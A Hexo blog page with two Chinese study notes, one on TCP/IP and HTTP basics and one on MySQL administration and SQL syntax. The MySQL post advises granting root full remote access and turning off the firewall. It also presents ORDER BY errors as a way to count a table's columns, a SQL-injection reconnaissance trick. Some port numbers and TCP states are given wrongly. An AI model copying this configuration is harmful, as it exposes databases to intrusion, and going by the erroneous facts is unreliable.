<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-TCPIP协议与HTTP协议" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/25/TCPIP协议与HTTP协议/" class="article-date">
  <time datetime="2018-12-25T13:34:31.000Z" itemprop="datePublished">2018-12-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/25/TCPIP协议与HTTP协议/">TCP/IP协议与HTTP协议</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="TCP-IP协议与HTTP协议"><a href="#TCP-IP协议与HTTP协议" class="headerlink" title="TCP/IP协议与HTTP协议"></a>TCP/IP协议与HTTP协议</h1><h2 id="一、TCP-IP协议"><a href="#一、TCP-IP协议" class="headerlink" title="一、TCP/IP协议"></a>一、TCP/IP协议</h2><p>TCP/IP协议，也称TCP/IP协议族或TCP/IP协议栈，其中：</p>
<p>TCP：Transmission Control Protocol 传输控制协议<br>IP： Internet Protocol 互联网协议</p>
<p>该协议是目前世界上应用最为广泛的协议，是以TCP和IP为基础的不同层次上多个协议的集合，两台主机要实现通讯，都必须遵守TCP/IP协议。</p>
<p>以下是ISO/OSI七层模型与TCP/IP四层模型对比：</p>
<p><img src="/http协议/图片1.png" alt="TCP"></p>
<p>区别：</p>
<p>1、前者是七层模型结构，后者是四层模型结构；</p>
<p>2、实际市场应用不同， ISO/OSI参考模型只是理论上的模型，并没有成熟的产品支持；而TCP/IP参考模型已经成为“实际上的国际标准”。</p>
<p>五层协议与四层协议基本相同，只不过是将网络接口层分开为物理层和数据链路层。</p>
<h2 id="二、TCP三次握手和四次挥手"><a href="#二、TCP三次握手和四次挥手" class="headerlink" title="二、TCP三次握手和四次挥手"></a>二、TCP三次握手和四次挥手</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>首先看一张图片</p>
<p><img src="/http协议/图片2.gif" alt="tcp"></p>
<p>在学习TCP协议的“三次握手”之前，先来了解TCP报文及格式：当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流时，TCP会把数据流分割成适当长度的报文段，之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。</p>
<h4 id="三次握手流程"><a href="#三次握手流程" class="headerlink" title="三次握手流程"></a>三次握手流程</h4><p>1.第一次握手：主机A将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给主机B，主机A进入SYN_SENT状态，等待主机B确认。</p>
<ol start="2">
<li>第二次握手：主机B收到数据包后由标志位SYN=1得知主机A请求建立连接，主机B将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给主机A以确认连接请求，主机B进入SYN_RCVD状态。</li>
</ol>
<p>3.第三次握手：主机A收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给主机B，主机B检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，主机A和主机B进入ESTABLISHED状态，完成三次握手，随后就可以开始传输数据了</p>
<h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p><img src="/http协议/图片3.gif" alt="tcp"></p>
<p>在了解4次挥手之前我们要知道为什么建立连接时是3次，而关闭时却是4次呢？</p>
<p>这是因为服务端的LISTEN状态下的SOCKET当收到SYN报文的连接请求后，它可以把ACK和SYN(ACK起应答作用，而SYN起同步作用)放在 一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可能 未必会马上会关闭SOCKET,也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报 文和FIN报文多数情况下都是分开发送的。 </p>
<p>（1）第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传送，客户端进入FIN 1状态。         </p>
<p>（2）第二次挥手：服务器收到FIN后，发送一个ACK给客户端，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），客户端进入CLOSE_WAIT状态。         </p>
<p>（3）第三次挥手：服务器发送一个FIN，用来关闭服务器到客户端的数据传送，服务器进入LAST_ACK状态。         </p>
<p>（4）第四次挥手：客户端收到FIN后，进入TIME_WAIT状态，接着发送一个ACK给服务器，确认序号为收到序号+1，进入CLOSED状态，完成四次挥手。 </p>
<h3 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h3><p><strong>21 FTP</strong></p>
<p><strong>22 SSH</strong></p>
<p><strong>23 Telnet</strong></p>
<p><strong>25 SMTP</strong></p>
<p><strong>80 http</strong></p>
<p><strong>110 pop3</strong></p>
<p><strong>135 smb</strong></p>
<p><strong>443 https</strong></p>
<p><strong>445 共享服务</strong></p>
<p><strong>1433 sql server</strong></p>
<p><strong>1531 oracle</strong></p>
<p><strong>3306 mysql</strong></p>
<p><strong>3389 rdp远程桌面</strong></p>
<p><strong>5432 postgresql</strong></p>
<p><strong>6379 redis</strong></p>
<p><strong>7001weblogic</strong></p>
<p><strong>8080 tomcat</strong></p>
<p><strong>10051 zabbix</strong></p>
<p><strong>27017 mongodb</strong></p>
<h2 id="二、HTTP协议"><a href="#二、HTTP协议" class="headerlink" title="二、HTTP协议"></a>二、HTTP协议</h2><p>HTTP协议作用在应用层，属于应用层协议。</p>
<h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><ul>
<li><p>200 - 请求成功</p>
</li>
<li><p>301 - 资源（网页等）被永久转移到其它URL</p>
</li>
<li><p>404 - 请求的资源（网页等）不存在</p>
</li>
<li><p>500 - 内部服务器错误</p>
<p>| 200  | OK                    | 请求成功。一般用于GET与POST请求                              |<br>| —- | ——————— | ———————————————————— |<br>| 400  | Bad Request           | 客户端请求的语法错误，服务器无法理解                         |<br>| 403  | Forbidden             | 服务器理解请求客户端的请求，但是拒绝执行此请求               |<br>| 404  | Not Found             | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 |<br>| 405  | Method Not Allowed    | 客户端请求中的方法被禁止                                     |<br>| 500  | Internal Server Error | 服务器内部错误，无法完成请求                                 |<br>| 502  | Bad Gateway           | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |</p>
</li>
</ul>
<h3 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h3><p><img src="/http协议/图片4.png" alt="http"></p>
<h3 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h3><p><img src="/http协议/图片5.png" alt="http"></p>
<p>举例：</p>
<p>GET / HTTP/1.1</p>
<p>Host: 192.168.11.111:8000</p>
<p>Accept: <em>/</em></p>
<p>//换行</p>
<h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>主要是GET和POST请求</p>
<h5 id="GET请求举例"><a href="#GET请求举例" class="headerlink" title="GET请求举例"></a>GET请求举例</h5><p><img src="/http协议/图片6.png" alt="http"></p>
<h5 id="POST请求举例"><a href="#POST请求举例" class="headerlink" title="POST请求举例"></a>POST请求举例</h5><p><img src="/http协议/图片7.png" alt="http"></p>
<h3 id="HTTP请求头和响应头"><a href="#HTTP请求头和响应头" class="headerlink" title="HTTP请求头和响应头"></a>HTTP请求头和响应头</h3><p>请求头：</p>
<p>User-Agent ；浏览器的标识信息</p>
<p>Accept 发送的数据类型（一般有text，json,xml）</p>
<p>Accept-Language  浏览器使用的语言</p>
<p>Accept-Encoding 指浏览器向中间件发送数据是使用的压缩方式</p>
<p>Host 访问的网站域名+端口</p>
<p>Cookie 网站认证信息</p>
<p>响应头：</p>
<p>Date 日期时间 这个时间为GTM时间，和我们的utc时间差8个小时</p>
<p>Set-Cookie cookie的来源（给网站设置Cookie）</p>
<p>Content-Type 告诉浏览器返回的内容格式</p>
<p>Serve 显示中间件的版本信息</p>
<p>X-Forwarded-By 使用的脚本语言</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/25/TCPIP协议与HTTP协议/" data-id="cjq4hvb3k0005oonp2k25yc4g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-mysql数据库基础知识笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/22/mysql数据库基础知识笔记/" class="article-date">
  <time datetime="2018-12-22T04:23:00.000Z" itemprop="datePublished">2018-12-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/12/22/mysql数据库基础知识笔记/">MySQL数据库基础知识笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库即存储数据的仓库，是一个管理数据的软件</p>
<h5 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h5><ul>
<li>关系型数据库（也称结构化数据库）<ul>
<li>MySQL：轻量级开源数据库，适用于中小型企业，性能较好</li>
<li>MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台</li>
<li>Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑</li>
<li>DB2</li>
<li>……</li>
</ul>
</li>
<li>非关系型数据库（也称非结构化数据库）<ul>
<li>redis、mongodb、Hbase、nosql等</li>
</ul>
</li>
</ul>
<h5 id="关系型数据库结构"><a href="#关系型数据库结构" class="headerlink" title="关系型数据库结构"></a>关系型数据库结构</h5><ol>
<li>数据库：可以看成是一个“文件柜”中的“小格子”</li>
<li>数据表：可以看成是一个具体的“文件”</li>
<li>记录、字段、数据<ul>
<li>一行，即一条记录</li>
<li>一列，即一个字段</li>
<li>行列交叉处，即数据</li>
</ul>
</li>
</ol>
<h1 id="MySQL登录和退出"><a href="#MySQL登录和退出" class="headerlink" title="MySQL登录和退出"></a>MySQL登录和退出</h1><p>登录MySQL有两种方式，一种是通过命令行登录进行操作，一种是通过工具登录进行操作，下面介绍通过DOS命令行进行登录</p>
<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>如果想在任意位置登录MySQL，则需要配置环境变量，如何判断是否配置好，可通过查看MySQL版本的命令进行判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -V			#切记是大写的`V`</span><br></pre></td></tr></table></figure>
<p><img src="/mysql/mysql-V01.png" alt="数据库"></p>
<p>如果出现如下情况即没有配置好：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘mysql -V 不是内部或外部命令，也不是可运行的程序或批处理文件。</span><br></pre></td></tr></table></figure>
<p>接下来进行配置，win7路径如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7--&gt;计算机--&gt;属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量--&gt;Path</span><br></pre></td></tr></table></figure>
<p>大差不差，网上教程很多，配一下就完事儿了，此处省略**字</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>在DOS命令行中，执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 主机名 -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>
<ul>
<li>-h：代表MySQL数据库主机名。本地主机名如：127.0.0.1。MySQL数据库默认端口号：3306</li>
<li>-u：代表MySQL用户名。如：root</li>
<li>-p：代表MySQL密码。如：root。在登录时，可以先不输入密码值</li>
</ul>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot -proot</span><br></pre></td></tr></table></figure>
<h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
<h2 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h2><p>如果忘记密码，莫慌，老夫看你骨骼惊奇，这个重置密码的方法，就赐予你了：</p>
<h5 id="phpstudy重置数据库密码："><a href="#phpstudy重置数据库密码：" class="headerlink" title="phpstudy重置数据库密码："></a>phpstudy重置数据库密码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其他选项菜单--&gt;mysql工具--&gt;重置密码</span><br></pre></td></tr></table></figure>
<h5 id="Linux（centos7）修改root密码："><a href="#Linux（centos7）修改root密码：" class="headerlink" title="Linux（centos7）修改root密码："></a>Linux（centos7）修改root密码：</h5><ul>
<li>MySQL版本低于8：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.修改配置文件：vi /etc/my.cnf 	添加：skip-grant-tables	重启MySQL服务</span><br><span class="line"></span><br><span class="line">2.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">3.改密码：</span><br><span class="line">update mysql.user set authentication_string=password(‘root&apos;),plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;</span><br><span class="line"></span><br><span class="line">4.更新数据库：flush privileges;</span><br><span class="line"></span><br><span class="line">5.退出</span><br><span class="line"></span><br><span class="line">6.再次修改配置文件，注释掉skip-grant-tables，重启MySQL服务，即可</span><br></pre></td></tr></table></figure>
<ul>
<li>MySQL版本为8及以上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.查看原始密码：(两种方法)</span><br><span class="line">    1).	grep &quot;password&quot; /var/log/mysqld.log</span><br><span class="line">    2).	cat /var/log/mysqld.log | grep &quot;password&quot;</span><br><span class="line">    </span><br><span class="line">2.使用原始密码登录：	mysql -uroot -p</span><br><span class="line"></span><br><span class="line">3.执行命令：		ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的密码&quot;;</span><br><span class="line"></span><br><span class="line">4.重启服务即可</span><br></pre></td></tr></table></figure>
<h2 id="允许外界连接的方法"><a href="#允许外界连接的方法" class="headerlink" title="允许外界连接的方法"></a>允许外界连接的方法</h2><ul>
<li><p>改表法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">进入MySQL，执行以下命令：</span><br><span class="line"></span><br><span class="line">首先要能远程访问，修改root的host为%</span><br><span class="line">update user set host=&apos;%&apos; where user=&apos;root&apos;;</span><br><span class="line">GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos;;</span><br><span class="line"></span><br><span class="line">其次，修改连接方式：</span><br><span class="line">ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;你的数据库密码&apos;;</span><br><span class="line">注意修改防火墙规则或者关闭防火墙</span><br></pre></td></tr></table></figure>
</li>
<li><p>授权法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu上安装mysql只需要几条命令就可以完成。</span><br><span class="line">  sudo apt-get install mysql-server 注意：安装时需要设置root密码</span><br><span class="line">  apt-get install mysql-client</span><br><span class="line">  sudo apt-get install libmysqlclient-dev</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">整型				INT</span><br><span class="line"></span><br><span class="line">浮点型			   FLOAT</span><br><span class="line"></span><br><span class="line">日期				DATE		YYYY-MM-DD</span><br><span class="line"></span><br><span class="line">时间				TIME		HH-MM-SS</span><br><span class="line"></span><br><span class="line">时间戳			   TIMESTAMP</span><br><span class="line"></span><br><span class="line">字符				CHAR</span><br><span class="line">				 VARCHAR</span><br><span class="line">				 </span><br><span class="line">文本				TEXT</span><br></pre></td></tr></table></figure>
<h1 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h1><p>在MySQL交互式环境中，所有命令必须以英文分号<code>;</code>结束</p>
<p>MySQL不区分大小写，但是把系统命令和自定义值以大小写区分会便于查看和排错</p>
<h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交互式环境：		CREATE DATABASE [IF NOT EXISTS] 数据库名 [CHARSET UTF8];</span><br><span class="line">DOS命令行：		  mysqladmin -uroot -proot CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>
<ul>
<li>IF NOT EXISTS：可选项，如果不存在，则创建数据库</li>
<li>数据库名：自定义</li>
<li>CHARSET：设置数据库的默认字符集</li>
</ul>
<p><img src="/mysql/create_db01.png" alt="数据库"></p>
<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS] 数据库名;</span><br></pre></td></tr></table></figure>
<h2 id="查看数据库的字符集"><a href="#查看数据库的字符集" class="headerlink" title="查看数据库的字符集"></a>查看数据库的字符集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>
<p><img src="/mysql/charset01.png" alt="数据库"></p>
<p>通过MySQL命令修改数据库的字符集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE 数据库名 DEFAULT CHARACTER SET gbk;</span><br></pre></td></tr></table></figure>
<p><img src="/mysql/charset02.png" alt="数据库"></p>
<h1 id="MySQL数据表操作"><a href="#MySQL数据表操作" class="headerlink" title="MySQL数据表操作"></a>MySQL数据表操作</h1><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><p>只有进入数据库里，才能操作数据表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure>
<h2 id="显示当前库中所有的数据表"><a href="#显示当前库中所有的数据表" class="headerlink" title="显示当前库中所有的数据表"></a>显示当前库中所有的数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure>
<h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名(字段1 字段1类型 字段1属性,字段2 字段2类型 字段2属性,……)</span><br></pre></td></tr></table></figure>
<ul>
<li>字段类型：tinyint、int、bigint、char、varchar、text、date、time等</li>
<li>字段属性：<ul>
<li>NOT NULL|NULL：是否可以为空</li>
<li>DEFAULT default_value：指该列的默认值<ul>
<li>default_value默认值可以是字符串，也可以是整型</li>
</ul>
</li>
<li>AUTO_INCREMENT：该列为自动增长型，或者自动编号。要求该列必须是整型。<strong>一个表只能有一个auto_increment属性</strong>。</li>
<li>PRIMARY KEY：主键。指定该列的值具有唯一性，主键所在的列不能为空。<strong>一个表的主键只能有一个</strong>。</li>
</ul>
</li>
</ul>
<p>一个数据表，由多个列构成。多个列定义之间用英文下的<strong>逗号</strong>隔开。</p>
<p><img src="/mysql/create_tb01.png" alt="数据库"></p>
<p><img src="/mysql/create_tb02.png" alt="数据库"></p>
<h2 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE [IF EXISTS] table_name;</span><br></pre></td></tr></table></figure>
<h2 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h2><p><img src="/mysql/alter_tb01.png" alt="数据库"></p>
<h2 id="describe显示表的结构定义"><a href="#describe显示表的结构定义" class="headerlink" title="describe显示表的结构定义"></a>describe显示表的结构定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESCRIBE 表名;	或		DESC 表名;</span><br></pre></td></tr></table></figure>
<p><img src="/mysql/desc01.png" alt="数据库"></p>
<h1 id="SQL基础"><a href="#SQL基础" class="headerlink" title="SQL基础"></a>SQL基础</h1><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="增加记录"><a href="#增加记录" class="headerlink" title="增加记录"></a>增加记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名(字段1,字段2,字段3,…) VALUES (值1,值2,值3,…)</span><br></pre></td></tr></table></figure>
<h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名 [WHERE 条件]</span><br></pre></td></tr></table></figure>
<p><strong>WHERE条件：如果省略，将删除所有记录</strong></p>
<h3 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 SET 字段1 = 新值1，字段2=新值2,… [WHERE条件]</span><br></pre></td></tr></table></figure>
<ul>
<li><p>需要更新的字段列出，不需要更新的不用管它</p>
</li>
<li><p>字段的顺序可以修改</p>
</li>
<li>WHERE条件不能省略，如果省略，所有记录都会修改</li>
</ul>
<h3 id="查询记录"><a href="#查询记录" class="headerlink" title="查询记录"></a>查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表|* FROM 表名 [WHERE条件] [ORDER BY排序][LIMIT限制输出]</span><br></pre></td></tr></table></figure>
<ul>
<li>字段字列表：查询某些字段的数据，各字段之间用逗号隔开，字段之间没有顺序</li>
<li><em>：表示显示所有列的数据。如：select </em> from news;</li>
<li>where：指查询的条件</li>
<li>ORDER BY：字段排序</li>
<li>LIMIT：限制输出</li>
</ul>
<h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><h3 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h3><p><img src="/mysql/where01.png" alt="数据库"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE id&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id&lt;100 and hits&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id=100 OR hits&lt;50;</span><br></pre></td></tr></table></figure>
<h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by n		如果后面跟数字，是按照第n列数据排序，如果n超过字段数，就报错</span><br><span class="line"></span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;5&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure>
<p><strong>由此可判断此表有几列</strong></p>
<h3 id="LIMIT-限制输出"><a href="#LIMIT-限制输出" class="headerlink" title="LIMIT  限制输出"></a>LIMIT  限制输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT startrow,pagesize;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>startrow从指定的行数起，开始返回数据</p>
</li>
<li><p>pagesize返回的记录数</p>
</li>
<li><p>举例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 0,10;  //从第0行起，返回10条记录</span><br><span class="line">LIMIT 10,10;  //从第10行起，返回10条记录</span><br><span class="line">LIMIT 20,10;  //从第20行起，返回10条记录</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="LIKE"><a href="#LIKE" class="headerlink" title="LIKE"></a>LIKE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通配符：</span><br><span class="line">	*		表示任意的字符</span><br><span class="line">	%		表示任意的字符</span><br><span class="line">	？	   表示一个字符</span><br><span class="line">SELECT * FROM 表名 WHERE 字段名 LIKE &apos;字符串&apos;;		其中字符串可用通配符</span><br></pre></td></tr></table></figure>
<h3 id="UNION-联合查询"><a href="#UNION-联合查询" class="headerlink" title="UNION  联合查询"></a>UNION  联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表|* FROM 表1 UNION SELECT 字段列表|* FROM 表2;</span><br></pre></td></tr></table></figure>
<p><strong>表1和表2中字段数应相同</strong></p>
<h3 id="DISTINCT-去重"><a href="#DISTINCT-去重" class="headerlink" title="DISTINCT  去重"></a>DISTINCT  去重</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  DISTINCT field FROM table_name [WHERE 条件]；</span><br></pre></td></tr></table></figure>
